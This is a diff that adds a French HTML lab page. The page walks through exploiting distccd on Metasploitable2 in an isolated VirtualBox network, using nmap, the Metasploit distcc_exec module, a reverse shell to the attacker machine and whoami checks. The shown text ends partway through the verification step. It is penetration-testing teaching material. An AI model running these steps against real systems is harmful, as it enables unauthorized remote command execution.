@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>distccd — Exécution de code</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0e14;
+    --panel:#12161f;
+    --panel-alt:#161b26;
+    --border:#232937;
+    --text:#e7e9ee;
+    --muted:#8b93a5;
+    --accent:#ff8a5c;
+    --accent-soft:#ff8a5c22;
+    --ok:#5fd9a4;
+    --ok-soft:#5fd9a422;
+    --serif:'Fraunces', serif;
+    --sans:'IBM Plex Sans', sans-serif;
+    --mono:'IBM Plex Mono', monospace;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{background:var(--accent-soft); color:var(--accent);}
+
+  a{color:var(--accent);}
+
+  .wrap{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px;
+  }
+
+  /* ---------- HERO ---------- */
+  .hero{
+    padding:96px 0 64px;
+    border-bottom:1px solid var(--border);
+  }
+  .breadcrumb{margin:0 0 18px;}
+  .breadcrumb a{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+    text-decoration:none;
+    border-bottom:1px solid transparent;
+  }
+  .breadcrumb a:hover{color:var(--accent); border-bottom-color:var(--accent);}
+  .hero .kicker{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 20px;
+  }
+  .hero .kicker::before{content:"$ "; color:var(--muted);}
+  .hero h1{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:clamp(34px,5vw,52px);
+    line-height:1.1;
+    margin:0 0 20px;
+    letter-spacing:-0.01em;
+  }
+  .hero p.lead{
+    font-size:17px;
+    color:var(--muted);
+    max-width:56ch;
+    margin:0 0 32px;
+  }
+  .meta-row{
+    display:flex;
+    flex-wrap:wrap;
+    gap:28px;
+  }
+  .meta-item{font-size:13px;}
+  .meta-item .label{
+    display:block;
+    color:var(--muted);
+    margin-bottom:4px;
+  }
+  .meta-item .value{
+    font-family:var(--mono);
+    color:var(--text);
+  }
+  .badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border:1px solid var(--ok);
+    color:var(--ok);
+    border-radius:3px;
+  }
+  .score-badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border-radius:3px;
+  }
+
+  /* ---------- SECTION GENERIC ---------- */
+  section{
+    padding:64px 0;
+    border-bottom:1px solid var(--border);
+  }
+  section:last-of-type{border-bottom:none;}
+  h2.section-title{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:28px;
+    margin:0 0 12px;
+  }
+  .section-intro{
+    color:var(--muted);
+    max-width:60ch;
+    margin:0 0 40px;
+    font-size:15px;
+  }
+
+  /* ---------- TIMELINE ---------- */
+  .timeline{
+    position:relative;
+    padding-left:44px;
+  }
+  .timeline::before{
+    content:"";
+    position:absolute;
+    left:15px;
+    top:6px;
+    bottom:6px;
+    width:1px;
+    background:var(--border);
+  }
+  .step{
+    position:relative;
+    margin-bottom:56px;
+  }
+  .step:last-child{margin-bottom:0;}
+  .step-num{
+    position:absolute;
+    left:-44px;
+    top:0;
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    background:var(--panel);
+    border:1px solid var(--border);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+  }
+  .step h3{
+    font-family:var(--sans);
+    font-weight:600;
+    font-size:19px;
+    margin:2px 0 6px;
+  }
+  .step .step-sub{
+    color:var(--muted);
+    font-size:14px;
+    margin:0 0 18px;
+  }
+
+  /* ---------- TERMINAL BLOCK ---------- */
+  .term{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin:0 0 18px;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .term-bar .dot{
+    width:7px; height:7px; border-radius:50%;
+    background:var(--border);
+  }
+  .term pre{
+    margin:0;
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.65;
+    overflow-x:auto;
+    white-space:pre-wrap;
+    word-break:break-word;
+  }
+  .term .prompt{color:var(--accent);}
+  .term .out{color:var(--muted);}
+  .term .ok{color:var(--ok);}
+  .term .flag{color:var(--accent);}
+
+  /* ---------- BOUTON COPIER (discret, par commande) ---------- */
+  .copy-btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    width:20px;
+    height:20px;
+    margin-left:8px;
+    padding:0;
+    border:1px solid transparent;
+    border-radius:4px;
+    background:transparent;
+    color:var(--muted);
+    font-size:12px;
+    line-height:1;
+    cursor:pointer;
+    vertical-align:middle;
+    opacity:.55;
+    transition:opacity .15s, border-color .15s, color .15s, background .15s;
+  }
+  .term:hover .copy-btn{opacity:.9;}
+  .copy-btn:hover{opacity:1; border-color:var(--border); background:var(--panel-alt); color:var(--accent);}
+  .copy-btn.copied{opacity:1; border-color:var(--ok); color:var(--ok);}
+
+  /* ---------- EXPLAIN BOX ---------- */
+  .explain{
+    display:grid;
+    grid-template-columns:auto 1fr;
+    gap:10px 12px;
+    background:transparent;
+    border-left:2px solid var(--border);
+    padding:2px 0 2px 18px;
+    margin-top:14px;
+  }
+  .explain .k{
+    font-family:var(--mono);
+    font-size:11px;
+    color:var(--muted);
+    padding-top:2px;
+    white-space:nowrap;
+  }
+  .explain .v{
+    font-size:14.5px;
+    color:var(--text);
+  }
+  .explain .v strong{color:var(--accent); font-weight:600;}
+  .explain .k.err{color:#ff5c72;}
+  .explain .v em.err-em{color:#ff5c72; font-style:normal; font-weight:600;}
+
+  /* ---------- MÉTHODE EXACTE (playbook récapitulatif) ---------- */
+  .playbook{
+    display:flex;
+    flex-direction:column;
+    gap:0;
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin-bottom:40px;
+  }
+  .playbook-row{
+    display:grid;
+    grid-template-columns:28px 1fr 1.3fr;
+    gap:16px;
+    padding:14px 18px;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+  }
+  .playbook-row:last-child{border-bottom:none;}
+  .playbook-num{
+    font-family:var(--mono);
+    color:var(--accent);
+    font-size:13px;
+  }
+  .playbook-what strong{
+    display:block;
+    font-size:14px;
+    color:var(--text);
+    margin-bottom:3px;
+  }
+  .playbook-what span{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--ok);
+  }
+  .playbook-why{
+    font-size:13px;
+    color:var(--muted);
+  }
+  @media (max-width:640px){
+    .playbook-row{grid-template-columns:1fr; gap:4px;}
+    .playbook-num{display:none;}
+  }
+
+  /* ---------- CHEATSHEET TABLE ---------- */
+  .cheat-group{margin-bottom:32px;}
+  .cheat-group h4{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 14px;
+    font-weight:500;
+  }
+  table.cheat{
+    width:100%;
+    border-collapse:collapse;
+    font-size:14px;
+  }
+  table.cheat td{
+    padding:10px 0;
+    border-bottom:1px solid var(--border);
+    vertical-align:top;
+  }
+  table.cheat td.cmd{
+    font-family:var(--mono);
+    color:var(--ok);
+    width:42%;
+    padding-right:20px;
+    white-space:nowrap;
+  }
+  table.cheat td.desc{color:var(--muted);}
+  table.cheat tr:last-child td{border-bottom:none;}
+
+  /* ---------- CONCEPT CARDS ---------- */
+  .concepts{
+    display:flex;
+    flex-direction:column;
+    gap:22px;
+  }
+  .concept{
+    padding:20px 0;
+    border-top:1px solid var(--border);
+  }
+  .concept:first-child{border-top:none; padding-top:0;}
+  .concept h4{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:18px;
+    margin:0 0 8px;
+  }
+  .concept p{
+    color:var(--muted);
+    margin:0;
+    font-size:14.5px;
+    max-width:62ch;
+  }
+
+  /* ---------- TERMINAL D'ENTRAÎNEMENT ---------- */
+  .practice-wrap{
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+  .info-bar{
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px 28px;
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:13px 18px;
+    font-family:var(--mono);
+    font-size:12.5px;
+  }
+  .info-bar .item{color:var(--muted);}
+  .info-bar .item strong{color:var(--accent); font-weight:500;}
+
+  .sim{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+  }
+  .sim-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .sim-progress{color:var(--accent);}
+  .sim-body{
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.7;
+    max-height:420px;
+    overflow-y:auto;
+  }
+  .sim-line{margin:0 0 4px; white-space:pre-wrap; word-break:break-word;}
+  .sim-line .p{color:var(--accent);}
+  /* ---------- PROMPT RÉALISTE (style Kali / zsh deux lignes) ---------- */
+  .p-kali{display:inline-flex; flex-direction:column; line-height:1.4; vertical-align:top;}
+  .p-kali .p-user{color:var(--ok); font-weight:600;}
+  .p-kali .p-punc{color:var(--muted);}
+  .p-kali .p-dollar{color:var(--accent); margin-left:4px;}
+  .p-root{color:#ff5c72; font-weight:600;}
+  .p-path{color:#5fbfff;}
+  .sim-line .o{color:var(--muted); display:block;}
+  .sim-line .o.ok{color:var(--ok);}
+  .sim-line .o.err{color:#ff5c72;}
+  .sim-line.appear{animation:fadeSlideIn .3s ease both;}
+  @keyframes fadeSlideIn{
+    from{opacity:0; transform:translateY(4px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* ligne mise en valeur pendant la correction */
+  .sim-line.hl{
+    background:rgba(255,138,92,.12);
+    border-radius:4px;
+    padding:2px 6px;
+    margin:0 -6px 4px;
+    animation:pulseGlow 1.3s ease-in-out 2;
+  }
+  @keyframes pulseGlow{
+    0%,100%{box-shadow:0 0 0 rgba(255,138,92,0);}
+    50%{box-shadow:0 0 14px rgba(255,138,92,.45);}
+  }
+
+  /* annotation ajoutée lors d'une correction d'analyse */
+  .sim-annot{
+    margin:2px 0 10px;
+    padding:8px 12px;
+    border-left:2px solid var(--accent);
+    color:var(--accent);
+    font-size:12.5px;
+    background:var(--accent-soft);
+    border-radius:0 6px 6px 0;
+  }
+
+  /* la ligne de saisie vit DANS le flux du terminal, comme un vrai shell —
+     c'est la dernière ligne, elle défile avec le reste, pas de bloc à part */
+  .sim-inputline{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    margin:0 0 4px;
+  }
+  .sim-inputline .p{color:var(--accent); flex-shrink:0;}
+  .sim-input{
+    flex:1;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:var(--text);
+    font-family:var(--mono);
+    font-size:13px;
+    caret-color:var(--accent);
+    padding:0;
+  }
+  .sim-input::placeholder{color:var(--muted); opacity:.6;}
+  .sim-controls{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:10px 18px 16px;
+    border-top:1px solid var(--border);
+    flex-wrap:wrap;
+  }
+  .sim-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .sim-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .sim-btn:active{transform:translateY(0);}
+  .sim-btn:disabled{opacity:.3; cursor:default; transform:none;}
+  .sim-btn.continue{border-color:var(--accent); color:var(--accent);}
+
+  .sim-hint-box{
+    margin:0 18px 12px;
+    padding:10px 14px;
+    border-left:2px solid var(--accent);
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease, margin .25s ease;
+  }
+  .sim-hint-box.show{
+    max-height:120px;
+    opacity:1;
+  }
+
+  @media (max-width:640px){
+    .sim-body{max-height:320px;}
+  }
+
+  /* ---------- BOUTON D'OUVERTURE DU TERMINAL ---------- */
+  .term-launch{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:28px;
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:12px;
+  }
+  .term-launch-btn{
+    font-family:var(--mono);
+    font-size:14px;
+    font-weight:600;
+    color:#05100b;
+    background:var(--ok);
+    border:none;
+    border-radius:8px;
+    padding:13px 24px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .term-launch-btn:hover{transform:translateY(-1px); box-shadow:0 8px 22px rgba(95,217,164,.28);}
+  .term-launch-btn:active{transform:translateY(0);}
+  .term-launch-dot{
+    width:8px; height:8px; border-radius:50%;
+    background:#05100b;
+    animation:launchBlink 1.6s ease-in-out infinite;
+  }
+  @keyframes launchBlink{0%,100%{opacity:1;} 50%{opacity:.2;}}
+  .term-launch-sub{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+    margin:0;
+  }
+
+  /* ---------- OVERLAY PLEIN ÉCRAN ---------- */
+  .term-fullscreen{
+    position:fixed;
+    inset:0;
+    z-index:9999;
+    display:none;
+    flex-direction:column;
+    background:radial-gradient(circle at 50% 0%, #131826 0%, #05070a 72%);
+    opacity:0;
+    transform:scale(.98);
+    transition:opacity .22s ease, transform .22s ease;
+  }
+  .term-fullscreen.open{
+    display:flex;
+    opacity:1;
+    transform:scale(1);
+  }
+  .term-fs-header{
+    flex-shrink:0;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+    padding:14px 22px 16px;
+  }
+  .term-fs-headrow{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:12px;
+  }
+  .term-fs-titlebar{
+    display:flex;
+    align-items:center;
+    gap:7px;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+  }
+  .term-fs-dot{width:9px; height:9px; border-radius:50%; display:inline-block;}
+  .term-fs-dot.r{background:#ff5f57;}
+  .term-fs-dot.y{background:#febc2e;}
+  .term-fs-dot.g{background:#28c840;}
+  .term-fs-context{margin-left:8px; color:var(--text);}
+  .term-fs-close{
+    font-family:var(--mono);
+    font-size:13px;
+    background:transparent;
+    border:1px solid var(--border);
+    color:var(--muted);
+    border-radius:6px;
+    width:30px; height:30px;
+    cursor:pointer;
+    transition:border-color .15s, color .15s, transform .15s;
+  }
+  .term-fs-close:hover{border-color:var(--accent); color:var(--accent); transform:translateY(-1px);}
+  .term-fs-info{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:8px 22px;
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    margin-bottom:14px;
+  }
+  .term-fs-info .item strong{color:var(--accent); font-weight:500;}
+
+  /* ---------- CONSIGNE FIXE (toujours visible, comme les infos IP) ---------- */
+  .term-fs-consigne{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin-top:14px;
+    padding:10px 12px;
+    background:var(--accent-soft);
+    border:1px solid var(--accent);
+    border-radius:6px;
+  }
+  .consigne-tag{
+    flex-shrink:0;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:2px 7px;
+    margin-top:1px;
+  }
+  .consigne-text{
+    font-family:var(--sans);
+    font-size:13.5px;
+    color:var(--text);
+    line-height:1.5;
+  }
+  .term-fs-info .item.mode{
+    text-transform:uppercase;
+    letter-spacing:.06em;
+    color:var(--ok);
+    font-size:10.5px;
+    border:1px solid var(--ok);
+    padding:3px 9px;
+    border-radius:3px;
+    transition:color .2s, border-color .2s;
+  }
+  .term-progress{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .term-progress-track{
+    flex:1;
+    height:6px;
+    border-radius:3px;
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    overflow:hidden;
+  }
+  .term-progress-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, var(--ok), var(--accent));
+    border-radius:3px;
+    transition:width .5s cubic-bezier(.4,0,.2,1);
+    box-shadow:0 0 10px rgba(95,217,164,.55);
+  }
+  .term-progress-label{
+    font-family:var(--mono);
+    font-size:11.5px;
+    color:var(--accent);
+    white-space:nowrap;
+  }
+
+  .term-fullscreen .sim-body{
+    flex:1;
+    overflow-y:auto;
+    max-height:none;
+    padding:20px 26px;
+    transition:filter .25s ease;
+  }
+  .term-fullscreen .sim-body.dimmed{
+    filter:brightness(.5) saturate(.85);
+    pointer-events:none;
+  }
+  .term-fs-footer{
+    flex-shrink:0;
+    border-top:1px solid var(--border);
+    background:var(--panel);
+  }
+  .term-fs-footer .sim-hint-box{margin:10px 22px 0;}
+  .term-fs-footer .sim-controls{padding:10px 22px 14px;}
+
+  /* ---------- POP-UP D'ANALYSE (remplace indice/solution/continuer en mode analyse) ---------- */
+  .analyze-popup{
+    margin:16px 22px 0;
+    padding:16px 18px;
+    border-radius:10px;
+    border:1px solid var(--accent);
+    background:linear-gradient(180deg, var(--accent-soft), var(--panel-alt) 75%);
+    box-shadow:0 14px 34px rgba(0,0,0,.4), 0 0 0 1px rgba(255,138,92,.08);
+    display:none;
+    flex-direction:column;
+    gap:12px;
+    animation:popIn .3s cubic-bezier(.34,1.56,.64,1) both;
+  }
+  .analyze-popup.leaving{animation:popOut .18s ease both;}
+  @keyframes popIn{
+    from{opacity:0; transform:translateY(14px) scale(.96);}
+    to{opacity:1; transform:translateY(0) scale(1);}
+  }
+  @keyframes popOut{
+    from{opacity:1; transform:scale(1);}
+    to{opacity:0; transform:scale(.95);}
+  }
+  .ap-tag{
+    align-self:flex-start;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:3px 8px;
+  }
+  .ap-question{
+    font-family:var(--sans);
+    font-size:14.5px;
+    color:var(--text);
+    line-height:1.55;
+    margin:0;
+  }
+  .ap-hint{
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    border-left:2px solid var(--accent);
+    padding-left:0;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease;
+  }
+  .ap-hint.show{max-height:200px; opacity:1; padding:8px 0 8px 12px;}
+  .ap-actions{display:flex; gap:8px; flex-wrap:wrap; align-items:center;}
+  .ap-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .ap-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .ap-btn.ap-continue{
+    margin-left:auto;
+    border-color:var(--ok);
+    color:var(--ok);
+    font-weight:600;
+    animation:ctaPulse 1.8s ease-in-out infinite;
+  }
+  @keyframes ctaPulse{
+    0%,100%{box-shadow:0 0 0 rgba(95,217,164,0);}
+    50%{box-shadow:0 0 16px rgba(95,217,164,.5);}
+  }
+
+  /* animation sobre au passage d'une étape à l'autre */
+  @keyframes successFlash{
+    0%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+    35%{box-shadow:inset 0 0 46px rgba(95,217,164,.16);}
+    100%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+  }
+  .sim-body.flash-ok{animation:successFlash .65s ease;}
+
+  @keyframes progressPulse{
+    0%,100%{box-shadow:0 0 10px rgba(95,217,164,.55);}
+    50%{box-shadow:0 0 18px rgba(95,217,164,.85);}
+  }
+  .term-progress-fill.pulse{animation:progressPulse .65s ease;}
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    padding:48px 0 80px;
+  }
+  footer .note{
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    background:var(--panel);
+  }
+  footer .note .ok{color:var(--ok);}
+
+  @media (max-width:600px){
+    .hero{padding:64px 0 48px;}
+    .timeline{padding-left:34px;}
+    .step-num{left:-34px; width:26px; height:26px; font-size:11px;}
+    .explain{grid-template-columns:1fr;}
+    .explain .k{padding-top:0;}
+    .practice-wrap{grid-template-columns:1fr;}
+    .info-panel{position:static;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="hero">
+      <p class="breadcrumb"><a href="index.html">← Hub</a></p>
+      <p class="kicker">metasploitable2 :: recon → exploit → post-exploit</p>
+      <h1>distccd<br>Exécution de code</h1>
+      <p class="lead">Un service de compilation distribuée légitime, exposé sans authentification. Aucune backdoor injectée ici — juste une fonctionnalité mal configurée qui accepte n'importe quelle commande.</p>
+      <div class="meta-row">
+        <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
+        <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
+        <div class="meta-item"><span class="label">Réseau</span><span class="value">Réseau interne VirtualBox (isolé)</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">shell utilisateur (daemon)</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">2/10 · Introduction</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff5c72; border:1px solid #ff5c72; background:#ff5c7218;">4/5 · Contrôle total</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <section id="chrono">
+      <h2 class="section-title">Chronologie</h2>
+      <p class="section-intro">Six étapes, dans l'ordre où elles doivent se faire — chacune répond à une question précise avant de passer à la suivante.</p>
+
+      <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
+      <div class="playbook">
+        <div class="playbook-row">
+          <div class="playbook-num">1</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -p 3632</span></div>
+          <div class="playbook-why">Identifier le service distccd et sa version exacte sur le port dédié, pour confirmer qu'il est bien exposé.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">2</div>
+          <div class="playbook-what"><strong>Analyse du contexte</strong><span>fonctionnalité légitime vs backdoor</span></div>
+          <div class="playbook-why">Comprendre que distccd n'a pas de code malveillant : c'est un service de compilation distribué qui accepte n'importe quelle commande sans authentification. La faille est dans la configuration par défaut.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">3</div>
+          <div class="playbook-what"><strong>Exploitation</strong><span>msfconsole / use exploit/unix/misc/distcc_exec</span></div>
+          <div class="playbook-why">Charger le module Metasploit qui exploite cette configuration par défaut et déclencher l'exécution de commande.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">4</div>
+          <div class="playbook-what"><strong>Vérification</strong><span>whoami</span></div>
+          <div class="playbook-why">Confirmer le niveau d'accès réel obtenu — ici un shell avec les privilèges du service (utilisateur daemon), pas root.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Post-exploitation</strong><span>id / pwd / ls</span></div>
+          <div class="playbook-why">Explorer le système avec les droits limités obtenus, en gardant en tête qu'une élévation de privilèges sera nécessaire pour aller plus loin.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">6</div>
+          <div class="playbook-what"><strong>Sortie</strong><span>exit</span></div>
+          <div class="playbook-why">Fermer proprement la session une fois les informations récupérées.</div>
+        </div>
+      </div>
+
+      <div class="timeline">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Reconnaissance ciblée — distccd</h3>
+          <p class="step-sub">Le service distccd écoute par défaut sur le port 3632. Un scan ciblé confirme sa présence et sa version.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> nmap -sV -p 3632 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 3632 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">PORT     STATE SERVICE VERSION</span>
+<span class="out">3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">-p 3632</span><span class="v">port par défaut du démon <strong>distccd</strong> — le service qui permet de distribuer des tâches de compilation sur le réseau.</span>
+            <span class="k">v1</span><span class="v">version du protocole distcc (pas la version du paquet). Une version aussi ancienne, combinée à une exposition réseau, est un signal fort.</span>
+            <span class="k">triage</span><span class="v">Ce n'est pas une backdoor ni un bug mémoire : c'est un service légitime. Mais il accepte <strong>n'importe quelle requête</strong> sans authentification — ce qui revient à donner un compilateur distant à quiconque peut l'atteindre.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Anatomie — ce qui est réellement en jeu</h3>
+          <p class="step-sub">Avant d'exploiter, il faut comprendre la nature exacte de la faille : ce n'est pas une backdoor.</p>
+          <div class="explain">
+            <span class="k">contraste</span><span class="v">Les cours <strong>vsftpd</strong> et <strong>UnrealIRCd</strong> portaient sur des <em>backdoors</em> : du code malveillant injecté délibérément dans une archive officielle piégée. Ici, <strong>aucun code malveillant n'a été ajouté</strong> — distccd est un logiciel de compilation distribuée parfaitement légitime.</span>
+            <span class="k">la faille</span><span class="v">Elle est dans la <strong>configuration par défaut</strong> : distccd accepte des requêtes de compilation depuis n'importe quelle machine du réseau, sans restriction d'adresse IP source ni authentification. N'importe qui peut lui soumettre une tâche de compilation qui exécutera des commandes arbitraires sur le serveur.</span>
+            <span class="k">conséquence</span><span class="v">Le service exécute les commandes avec ses propres privilèges — l'utilisateur <strong>daemon</strong> ici, pas root. C'est un point crucial à ne pas confondre avec les backdoors qui donnaient directement root.</span>
+            <span class="k">à retenir</span><span class="v">Toute fonctionnalité légitime exposée sans authentification devient une porte d'entrée. La question n'est pas « ce logiciel a-t-il une backdoor ? » mais « qui peut lui parler, et que peut-il faire pour eux ? »</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Exploitation — module Metasploit</h3>
+          <p class="step-sub">Metasploit dispose d'un module dédié à cette configuration par défaut.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Metasploit tip: You can pivot connections over sessions started with the ssh_login modules</span>
+<span class="out">=[ metasploit v6.4.135-dev                               ]</span>
+<span class="out">+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]</span>
+
+<span class="prompt">msf ></span> use exploit/unix/misc/distcc_exec<button class="copy-btn" type="button" data-copy="use exploit/unix/misc/distcc_exec" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf exploit(distcc_exec) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span>
+<span class="prompt">msf exploit(distcc_exec) ></span> run<button class="copy-btn" type="button" data-copy="run" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
+<span class="ok">[+] 192.168.56.20:3632 - Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">distcc_exec</span><span class="v">module Metasploit qui exploite la configuration par défaut de distccd. Il soumet une fausse tâche de compilation au service, laquelle contient la commande à exécuter.</span>
+            <span class="k">reverse shell</span><span class="v">Comme pour vsftpd, le payload est un reverse shell : la cible rappelle l'attaquant (LHOST automatiquement détecté ou à régler manuellement).</span>
+            <span class="k">session ouverte</span><span class="v">La ligne <strong>Command shell session 1 opened</strong> indique que le shell est obtenu. Pas de Meterpreter ici — directement un shell système.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <h3>Vérification — le niveau d'accès réel</h3>
+          <p class="step-sub">La question la plus importante après une exploitation : qui suis-je sur cette machine ?</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>shell</div>
+            <pre><span class="prompt">$</span> whoami<button class="copy-btn" type="button" data-copy="whoami" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">daemon</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">daemon</span><span class="v">le shell s'exécute avec les privilèges de l'utilisateur <strong>daemon</strong> — c'est le compte sous lequel tourne le service distccd. Pas root.</span>
